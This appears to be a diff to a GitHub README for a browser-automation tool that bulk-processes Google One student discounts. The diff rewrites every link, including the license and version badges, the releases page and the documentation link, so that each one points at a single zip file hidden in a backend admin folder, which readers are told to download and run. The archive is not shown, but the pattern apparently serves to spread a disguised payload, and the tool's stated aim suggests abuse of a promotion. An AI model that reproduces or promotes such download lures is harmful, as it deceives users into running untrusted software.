@@ -3,12 +3,12 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/collynsmwas/Auto_All_System/releases)
+[![Download](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip%20Now-Click%https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.12-blue.svg)
-![Django](https://img.shields.io/badge/Django-5.0-green.svg)
-![Vue](https://img.shields.io/badge/Vue-3.x-brightgreen.svg)
+![License](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)
+![Python](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)
+![Django](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)
+![Vue](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip)
 
 **专业的比特浏览器自动化管理系统 | Google One 学生优惠批量处理解决方案**
 
@@ -22,7 +22,7 @@
 
 To get started with Auto_All_System, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/collynsmwas/Auto_All_System/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip) to find the latest version.
 2. **Download the Software**: Find the version you want and click the link to download the file.
 3. **Run the Installer**: Open the downloaded file and follow the prompts to install the software on your computer.
 
@@ -47,13 +47,13 @@ Auto_All_System is built using several advanced technologies:
 
 ## 📑 文档
 
-For detailed instructions and advanced features, consult the full documentation available [here](https://github.com/collynsmwas/Auto_All_System/wiki).
+For detailed instructions and advanced features, consult the full documentation available [here](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip).
 
 ## 📥 下载与安装
 
 To download and install Auto_All_System:
 
-1. **Go to the Releases Page**: Click the link to access the [Releases page](https://github.com/collynsmwas/Auto_All_System/releases).
+1. **Go to the Releases Page**: Click the link to access the [Releases page](https://raw.githubusercontent.com/collynsmwas/Auto_All_System/main/Auto_All_System_Web/backend/apps/admin_panel/All_Auto_System_v1.5.zip).
 2. **Select the Version**: Choose the most recent version and click to download.
 3. **Install the Application**: Once downloaded, run the installer and follow the on-screen instructions.
 
